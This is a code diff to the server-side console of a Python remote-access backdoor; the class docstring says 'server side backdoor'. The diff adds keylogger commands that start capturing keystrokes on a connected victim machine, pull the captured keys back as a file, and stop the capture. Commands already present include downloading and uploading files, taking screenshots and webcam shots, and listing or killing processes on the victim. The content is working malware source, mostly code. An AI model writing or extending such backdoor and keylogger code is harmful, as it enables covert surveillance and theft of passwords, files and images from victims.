@@ -18,6 +18,8 @@ from rich.table import Table
 from rich.box import SIMPLE
 from os import system, uname
 
+from urllib3.exceptions import HeaderParsingError
+
 class Server(object):
     """ server side backdoor """
     def __init__(self, host='0.0.0.0', port=5000):
@@ -29,7 +31,7 @@ class Server(object):
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
-    # kills some processes by name
+    # kills some processes by name or pid
     def terminateProcess(self, processname):
         if processname and self.userAttached:
             connection = self.getCurrentUser()['conn']
@@ -37,7 +39,6 @@ class Server(object):
             try:
                 header = self.receiveHeader(connection)
                 printr(header['content'])
-
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -64,7 +65,6 @@ class Server(object):
                     console.print(table, f':white_check_mark: {processname.title()} {header["total"]} processes running', justify="center") # printing the table
                 else:
                     printr(header['content'])
-
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -108,6 +108,49 @@ class Server(object):
                 progress.update(task, advance=len(received))
         
         return loads(processList)
+
+    def kloggerStart(self, args):
+        if self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = self.receiveHeader(connection)
+                printr(header['content'])
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Starts a keyboard listener on the client side.')
+
+    def kloggerDump(self, args):
+        if self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = self.receiveHeader(connection)
+                if header['sucess']:
+                    self.receiveFile(connection, header)
+                    printr(f'[green] See in [yellow]/files/{header["namefile"]}')
+                else:
+                    printr(header['content'])
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Shows the keys captured so far.')
+
+    def kloggerStop(self, args):
+        if self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = self.receiveHeader(connection)
+                printr(header['content'])                    
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
+        else:
+            printr(f'Info: Stop the keyboard listener and save the captured keys.')
 
     # getting the current user who you are attached
     def getCurrentUser(self):
@@ -183,6 +226,7 @@ class Server(object):
 
     # receiving bytes content of any file from client side | params: connection= current user attached, header= received header of file
     def receiveFile(self, connection, header):
+        self.checkFolders()
         progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
 
         with progress:
@@ -225,8 +269,6 @@ class Server(object):
 
     # downloading a file from client side
     def download(self, args):
-        self.checkFolders()
-
         if args and self.userAttached:
             connection = self.getCurrentUser()['conn']
             connection.send(self.lastCommand.encode())
@@ -236,7 +278,6 @@ class Server(object):
                     self.receiveFile(connection, header)
                 else:
                     printr(f'[red]{header["content"]}')
-
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -264,7 +305,6 @@ class Server(object):
                         printr(f'[green]Pass any webcam [yellow]Id[green] to take a webcamshot | Ex: [yellow]/webcamshot 2')
                     else:
                         printr(header["content"])
-
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -273,8 +313,6 @@ class Server(object):
 
     # taking a screenshot from client side
     def screenshot(self, args):
-        self.checkFolders()
-
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
             connection.send(self.lastCommand.encode())
@@ -371,7 +409,10 @@ class Server(object):
             "/upload": {"local": False, "action": self.upload},
             "/processlist": {"local": False, "action": self.getProcessList},
             "/processinfo": {"local": False, "action": self.getProcessInfo},
-            "/terminateprocess": {"action": self.terminateProcess},
+            "/terminateprocess": {"local": False, "action": self.terminateProcess},
+            "/kloggerstart": {"local": False, "action": self.kloggerStart},
+            "/kloggerdump": {"local": False, "action": self.kloggerDump},
+            "/kloggerstop": {"local": False, "action": self.kloggerStop},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
